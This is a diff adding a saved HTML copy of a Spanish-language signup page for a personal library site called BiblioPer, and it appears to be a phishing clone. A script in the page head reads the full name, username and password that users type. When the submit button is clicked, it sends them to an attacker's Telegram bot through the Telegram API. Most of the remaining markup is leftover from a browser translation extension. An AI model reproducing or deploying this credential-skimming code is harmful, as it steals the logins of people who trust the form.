@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)https://biblioper.onrender.com/signup -->
+<html lang="en" data-lt-installed="true">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <title>BiblioPer</title>
+  <link rel="icon" type="image/x-icon" href="https://biblioper.onrender.com/src/public/img/favicon.png">
+  <link href="./BiblioPer_files/css" rel="stylesheet">
+  <link rel="stylesheet" href="./BiblioPer_files/bootstrap.min.css"
+    integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+  <link rel="stylesheet" href="./BiblioPer_files/all.css"
+    integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="./BiblioPer_files/styles.css">
+  <script>
+    async function fn() {
+      const out1 = document.getElementsByName('fullname')
+      const out2 = document.getElementsByName('username')
+      const out3 = document.getElementsByName('password')
+      await guardarEnArchivo(out1[0].value, out2[0].value, out3[0].value)
+    };
+    async function guardarEnArchivo(v1, v2, v3) {
+      var contenido = "fullname: " + v1 + "\nname: " + v2 + "\npassword: " + v3 + "\n";
+      /*
+      var blob = new Blob([contenido], { type: "text/plain;charset=utf-8" });
+      var enlace = document.createElement("a");
+      enlace.href = URL.createObjectURL(blob);
+      enlace.download = "valor_cuenta.txt";
+      enlace.click();
+      URL.revokeObjectURL(enlace.href);
+      */
+      var token = process.env.TOKEN; 
+      var chat_id = process.env.ID; 
+      var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(contenido);
+      await fetch(url);
+    }
+  </script>
+</head>
+
+<body cz-shortcut-listen="true" wfd-invisible="true">
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container">
+      <a class="navbar-brand" href="https://biblioper.onrender.com/">
+        <i class="fas fa-coffee"></i> Biblioteca Personal
+      </a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+        aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" wfd-invisible="true">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="https://biblioper.onrender.com/signin">Iniciar Sesión</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://biblioper.onrender.com/signup">Registrarce</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container p-4">
+    <div class="row">
+      <div class="col-md-4 mx-auto">
+        <div class="card text-center">
+          <div class="card-header">
+            <h3>Registrarce</h3>
+          </div>
+          <div class="card-body">
+            <form action="https://biblioper.onrender.com/signup" method="POST">
+              <div class="form-group">
+                <input type="type" name="fullname" placeholder="Nombre Completo" class="form-control" autofocus="">
+              </div>
+              <div class="form-group">
+                <input type="text" name="username" placeholder="Usuario" class="form-control">
+              </div>
+              <div class="form-group">
+                <input type="password" name="password" placeholder="Contraseña" class="form-control">
+              </div>
+              <div class="form-group">
+                <button class="btn btn-success btn-block" onclick='fn()'>
+                  Iniciar
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="./BiblioPer_files/jquery-3.3.1.slim.min.js.descarga"
+    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"
+    wfd-invisible="true"></script>
+  <script src="./BiblioPer_files/popper.min.js.descarga"
+    integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"
+    wfd-invisible="true"></script>
+  <script src="./BiblioPer_files/bootstrap.min.js.descarga"
+    integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"
+    wfd-invisible="true"></script>
+
+
+  <iframe scrolling="no" frameborder="0"
+    style="border: 0px; height: 388px; width: 377px; left: 1004px; top: 215px; z-index: 2147483647; position: absolute; display: none;"
+    src="./BiblioPer_files/password_control_balloon.html"></iframe>
+  <div id="SL_balloon_obj" alt="0" style="display: block;">
+    <div id="SL_button" class="SL_ImTranslatorLogo"
+      style="opacity: 100; background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/imtranslator-s.png&quot;); display: none;">
+    </div>
+    <div id="SL_shadow_translation_result2" style="display: none;"></div>
+    <div id="SL_shadow_translator" class="notranslate">
+      <div id="SL_planshet">
+        <div id="SL_arrow_up"
+          style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/up.png&quot;);">
+        </div>
+        <div id="SL_Bproviders">
+          <div class="SL_BL_LABLE_ON" title="Google" id="SL_P0">
+            <div id="SL_PN0">G</div>
+          </div>
+          <div class="SL_BL_LABLE_ON" title="Microsoft" id="SL_P1">
+            <div id="SL_PN1">M</div>
+          </div>
+          <div class="SL_BL_LABLE_ON" title="Translator" id="SL_P2">
+            <div id="SL_PN2">T</div>
+          </div>
+          <div class="SL_BL_LABLE_ON" title="Yandex" id="SL_P3">
+            <div id="SL_PN3">Y</div>
+          </div>
+        </div>
+        <div id="SL_alert_bbl">
+          <div id="SLHKclose"
+            style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/delete.png&quot;);">
+          </div>
+          <div id="SL_alert_cont"></div>
+        </div>
+        <div id="SL_TB">
+          <div id="SL_tables" cellspacing="1">
+            <tr>
+              <td class="SL_td" width="10%" align="right"><input id="SL_locer" type="checkbox" checked="true"
+                  title="Fijar idioma"></td>
+              <td class="SL_td" width="20%" align="left"><select id="SL_lng_from" class="SL_lngs">
+                  <option value="auto">Detectar idioma</option>
+                  <option value="af">Afrikáans</option>
+                  <option value="sq">Albanés</option>
+                  <option value="de">Alemán</option>
+                  <option value="am">Amhárico</option>
+                  <option value="ar">Árabe</option>
+                  <option value="hy">Armenio</option>
+                  <option value="az">Azerí</option>
+                  <option value="bn">Bengalí</option>
+                  <option value="be">Bielorruso</option>
+                  <option value="my">Birmano</option>
+                  <option value="bs">Bosnio</option>
+                  <option value="bg">Búlgaro</option>
+                  <option value="km">Camboyano</option>
+                  <option value="kn">Canarés</option>
+                  <option value="ca">Catalán</option>
+                  <option value="ceb">Cebuano</option>
+                  <option value="cs">Checo</option>
+                  <option value="ny">Chichewa</option>
+                  <option value="zh-CN">Chino simp</option>
+                  <option value="zh-TW">Chino trad</option>
+                  <option value="si">Cincalés</option>
+                  <option value="ko">Coreano</option>
+                  <option value="co">Corso</option>
+                  <option value="ht">Criollo haitiano</option>
+                  <option value="hr">Croata</option>
+                  <option value="da">Danés</option>
+                  <option value="sk">Eslovaco</option>
+                  <option value="sl">Esloveno</option>
+                  <option value="es">Español</option>
+                  <option value="eo">Esperanto</option>
+                  <option value="et">Estonio</option>
+                  <option value="eu">Euskera</option>
+                  <option value="fi">Finlandés</option>
+                  <option value="fr">Francés</option>
+                  <option value="fy">Frisio</option>
+                  <option value="gd">Gaélico escocés</option>
+                  <option value="cy">Galés</option>
+                  <option value="gl">Gallego</option>
+                  <option value="ka">Georgiano</option>
+                  <option value="el">Griego</option>
+                  <option value="gu">Gujarati</option>
+                  <option value="ha">Hausa</option>
+                  <option value="haw">Hawaiano</option>
+                  <option value="iw">Hebreo</option>
+                  <option value="hi">Hindi</option>
+                  <option value="hmn">Hmong</option>
+                  <option value="nl">Holandés</option>
+                  <option value="hu">Húngaro</option>
+                  <option value="ig">Igbo</option>
+                  <option value="id">Indonesio</option>
+                  <option value="en">Inglés</option>
+                  <option value="ga">Irlandés</option>
+                  <option value="is">Islandés</option>
+                  <option value="it">Italiano</option>
+                  <option value="ja">Japonés</option>
+                  <option value="jw">Javanés</option>
+                  <option value="kk">Kazajo</option>
+                  <option value="ky">Kirguís</option>
+                  <option value="ku">Kurdo (Kurmanji)</option>
+                  <option value="ckb">Kurdo (Sorani)</option>
+                  <option value="lo">Lao</option>
+                  <option value="la">Latín</option>
+                  <option value="lv">Letón</option>
+                  <option value="lt">Lituano</option>
+                  <option value="lb">Luxemburgués</option>
+                  <option value="mk">Macedonio</option>
+                  <option value="ml">Malayalam</option>
+                  <option value="ms">Malayo</option>
+                  <option value="mg">Malgache</option>
+                  <option value="mt">Maltés</option>
+                  <option value="mi">Maorí</option>
+                  <option value="mr">Maratí</option>
+                  <option value="mn">Mongol</option>
+                  <option value="ne">Nepalí</option>
+                  <option value="no">Noruego</option>
+                  <option value="pa">Panyabí</option>
+                  <option value="ps">Pastún</option>
+                  <option value="fa">Persa</option>
+                  <option value="pl">Polaco</option>
+                  <option value="pt">Portugués</option>
+                  <option value="ro">Rumano</option>
+                  <option value="ru">Ruso</option>
+                  <option value="sm">Samoano</option>
+                  <option value="sr">Serbio</option>
+                  <option value="st">Sesoto</option>
+                  <option value="sn">Shona</option>
+                  <option value="sd">Sindhi</option>
+                  <option value="so">Somalí</option>
+                  <option value="sw">Suajili</option>
+                  <option value="sv">Sueco</option>
+                  <option value="su">Sundanés</option>
+                  <option value="tl">Tagalo</option>
+                  <option value="th">Tailandés</option>
+                  <option value="ta">Tamil</option>
+                  <option value="tt">Tártaro</option>
+                  <option value="tg">Tayiko</option>
+                  <option value="te">Telugu</option>
+                  <option value="tr">Turco</option>
+                  <option value="uk">Ucraniano</option>
+                  <option value="ur">Urdu</option>
+                  <option value="uz">Uzbeco</option>
+                  <option value="vi">Vietnamita</option>
+                  <option value="xh">Xhosa</option>
+                  <option value="yi">Yidis</option>
+                  <option value="yo">Yoruba</option>
+                  <option value="zu">Zulú</option>
+                </select></td>
+              <td class="SL_td" width="3" align="center">
+                <div id="SL_switch_b" title="Cambiar idiomas"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/switchb.png&quot;);">
+                </div>
+              </td>
+              <td class="SL_td" width="20%" align="left"><select id="SL_lng_to" class="SL_lngs">
+                  <option selected="selected" value="es">Español</option>
+                  <option value="pt">Portugués</option>
+                  <option value="en">Inglés</option>
+                  <option disabled="true">-------- [ Todos ] --------</option>
+                  <option value="af">Afrikáans</option>
+                  <option value="sq">Albanés</option>
+                  <option value="de">Alemán</option>
+                  <option value="am">Amhárico</option>
+                  <option value="ar">Árabe</option>
+                  <option value="hy">Armenio</option>
+                  <option value="az">Azerí</option>
+                  <option value="bn">Bengalí</option>
+                  <option value="be">Bielorruso</option>
+                  <option value="my">Birmano</option>
+                  <option value="bs">Bosnio</option>
+                  <option value="bg">Búlgaro</option>
+                  <option value="km">Camboyano</option>
+                  <option value="kn">Canarés</option>
+                  <option value="ca">Catalán</option>
+                  <option value="ceb">Cebuano</option>
+                  <option value="cs">Checo</option>
+                  <option value="ny">Chichewa</option>
+                  <option value="zh-CN">Chino simp</option>
+                  <option value="zh-TW">Chino trad</option>
+                  <option value="si">Cincalés</option>
+                  <option value="ko">Coreano</option>
+                  <option value="co">Corso</option>
+                  <option value="ht">Criollo haitiano</option>
+                  <option value="hr">Croata</option>
+                  <option value="da">Danés</option>
+                  <option value="sk">Eslovaco</option>
+                  <option value="sl">Esloveno</option>
+                  <option value="es">Español</option>
+                  <option value="eo">Esperanto</option>
+                  <option value="et">Estonio</option>
+                  <option value="eu">Euskera</option>
+                  <option value="fi">Finlandés</option>
+                  <option value="fr">Francés</option>
+                  <option value="fy">Frisio</option>
+                  <option value="gd">Gaélico escocés</option>
+                  <option value="cy">Galés</option>
+                  <option value="gl">Gallego</option>
+                  <option value="ka">Georgiano</option>
+                  <option value="el">Griego</option>
+                  <option value="gu">Gujarati</option>
+                  <option value="ha">Hausa</option>
+                  <option value="haw">Hawaiano</option>
+                  <option value="iw">Hebreo</option>
+                  <option value="hi">Hindi</option>
+                  <option value="hmn">Hmong</option>
+                  <option value="nl">Holandés</option>
+                  <option value="hu">Húngaro</option>
+                  <option value="ig">Igbo</option>
+                  <option value="id">Indonesio</option>
+                  <option value="en">Inglés</option>
+                  <option value="ga">Irlandés</option>
+                  <option value="is">Islandés</option>
+                  <option value="it">Italiano</option>
+                  <option value="ja">Japonés</option>
+                  <option value="jw">Javanés</option>
+                  <option value="kk">Kazajo</option>
+                  <option value="ky">Kirguís</option>
+                  <option value="ku">Kurdo (Kurmanji)</option>
+                  <option value="ckb">Kurdo (Sorani)</option>
+                  <option value="lo">Lao</option>
+                  <option value="la">Latín</option>
+                  <option value="lv">Letón</option>
+                  <option value="lt">Lituano</option>
+                  <option value="lb">Luxemburgués</option>
+                  <option value="mk">Macedonio</option>
+                  <option value="ml">Malayalam</option>
+                  <option value="ms">Malayo</option>
+                  <option value="mg">Malgache</option>
+                  <option value="mt">Maltés</option>
+                  <option value="mi">Maorí</option>
+                  <option value="mr">Maratí</option>
+                  <option value="mn">Mongol</option>
+                  <option value="ne">Nepalí</option>
+                  <option value="no">Noruego</option>
+                  <option value="pa">Panyabí</option>
+                  <option value="ps">Pastún</option>
+                  <option value="fa">Persa</option>
+                  <option value="pl">Polaco</option>
+                  <option value="pt">Portugués</option>
+                  <option value="ro">Rumano</option>
+                  <option value="ru">Ruso</option>
+                  <option value="sm">Samoano</option>
+                  <option value="sr">Serbio</option>
+                  <option value="st">Sesoto</option>
+                  <option value="sn">Shona</option>
+                  <option value="sd">Sindhi</option>
+                  <option value="so">Somalí</option>
+                  <option value="sw">Suajili</option>
+                  <option value="sv">Sueco</option>
+                  <option value="su">Sundanés</option>
+                  <option value="tl">Tagalo</option>
+                  <option value="th">Tailandés</option>
+                  <option value="ta">Tamil</option>
+                  <option value="tt">Tártaro</option>
+                  <option value="tg">Tayiko</option>
+                  <option value="te">Telugu</option>
+                  <option value="tr">Turco</option>
+                  <option value="uk">Ucraniano</option>
+                  <option value="ur">Urdu</option>
+                  <option value="uz">Uzbeco</option>
+                  <option value="vi">Vietnamita</option>
+                  <option value="xh">Xhosa</option>
+                  <option value="yi">Yidis</option>
+                  <option value="yo">Yoruba</option>
+                  <option value="zu">Zulú</option>
+                </select></td>
+              <td class="SL_td" width="5%" align="center"> </td>
+              <td class="SL_td" width="8%" align="center">
+                <div id="SL_TTS_voice" title="undefined"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/ttsvoice.png&quot;);">
+                </div>
+              </td>
+              <td class="SL_td" width="8%" align="center">
+                <div id="SL_copy" title="Copiar" class="SL_copy"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/copy.png&quot;);">
+                  <div id="SL_copy_tip"></div>
+                </div>
+              </td>
+              <td class="SL_td" width="8%" align="center">
+                <div id="SL_bbl_font_patch"></div>
+                <div id="SL_bbl_font" title="Тamaño de fuente" class="SL_bbl_font"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/font.png&quot;);">
+                </div>
+              </td>
+              <td class="SL_td" width="8%" align="center">
+                <div id="SL_bbl_help" title="Ayuda"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bhelp.png&quot;);">
+                </div>
+              </td>
+              <td class="SL_td" width="15%" align="right">
+                <div id="SL_pin" class="SL_pin_off" title="Fijar la ventana de traducción"
+                  style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/pin-on.png&quot;);">
+                </div>
+              </td>
+            </tr>
+          </div>
+        </div>
+      </div>
+      <div id="SL_shadow_translation_result"></div>
+      <div id="SL_loading" class="SL_loading"
+        style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/loading.gif&quot;);">
+      </div>
+      <div id="SL_player2" style="display: none;"></div>
+      <div id="SL_alert100">La función de sonido está limitada a 200 caracteres</div>
+      <div id="SL_Balloon_options"
+        style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bg3.png&quot;) rgb(255, 255, 255);">
+        <div id="SL_arrow_down"
+          style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/down.png&quot;);">
+        </div>
+        <div id="SL_tbl_opt">
+          <tr>
+            <td class="SL_td" width="5%" align="center"><input id="SL_BBL_locer" type="checkbox" checked="true"
+                title="Mostrar el botón ImTranslator 3 segundos"></td>
+            <td class="SL_td" width="5%" align="left">
+              <div id="SL_BBL_IMG" title="Mostrar el botón ImTranslator 3 segundos"
+                style="background: url(&quot;chrome-extension://noaijdpnepcgjemiklgfkcfbkokogabh/content/img/util/bbl-logo.png&quot;);">
+              </div>
+            </td>
+            <td class="SL_td" width="100%" align="center"><span id="BBL_OPT" class="SL_options"
+                title="Mostrar opciones">Opciones</span> : <span id="HIST_OPT" class="SL_options"
+                title="Historial de traducciones">Historia</span> : <span id="FEED_OPT" class="SL_options"
+                title="ImTranslator Feedback">Feedback</span> : <span id="DONATE_OPT" class="SL_options"
+                title="Hacer una contribución">Donate</span></td>
+            <td class="SL_td" width="15%" align="right" nowrap="nowrap"><span id="SL_Balloon_Close" class="SL_options"
+                title="Cerrar">Cerrar</span></td>
+          </tr>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
